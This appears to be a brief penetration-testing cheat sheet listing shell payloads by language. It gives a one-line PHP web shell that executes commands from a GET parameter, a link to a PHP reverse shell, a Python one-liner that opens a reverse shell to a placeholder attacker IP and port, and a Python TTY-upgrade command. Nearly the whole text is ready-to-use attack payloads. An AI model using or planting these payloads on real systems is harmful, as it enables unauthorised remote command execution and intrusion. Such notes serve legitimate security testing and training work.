# Shell

## PHP

### Full shell

* https://github.com/pentestmonkey/php-reverse-shell

### Command shell

```<?php echo shell_exec($_GET['cmd']); ?>```

## Python

### Full shell 

Useful for OTRS and Web2py, those using Python.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOURIP>",<YOURLISTENINGPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Command shell

N/A

### TTY shell

From https://netsec.ws/?p=337

Commonly used:

`python -c 'import pty; pty.spawn("/bin/sh")'`
